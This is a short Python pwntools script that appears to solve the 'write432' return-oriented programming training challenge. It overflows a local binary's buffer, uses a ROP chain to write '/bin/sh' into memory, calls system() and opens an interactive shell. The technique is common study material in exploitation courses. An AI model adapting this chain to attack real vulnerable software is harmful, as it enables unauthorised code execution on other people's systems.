#!/usr/bin/python

from pwn import *

c = process("./write432")

offset = 44
system = 0x0804865a
data = 0x0804a028
pop_edi_ebp = 0x080486da	# pop edi; pop ebp; ret;
mov_edi_ebp = 0x08048670	# mov dword ptr [edi], ebp; ret;

payload = "a"*44
payload += p32(pop_edi_ebp)
payload += p32(data)
payload += "/bin"
payload += p32(mov_edi_ebp)
payload += p32(pop_edi_ebp)
payload += p32(data+4)
payload += "/sh\x00"
payload += p32(mov_edi_ebp)
payload += p32(system)
payload += p32(data)

c.sendline(payload)

c.interactive()

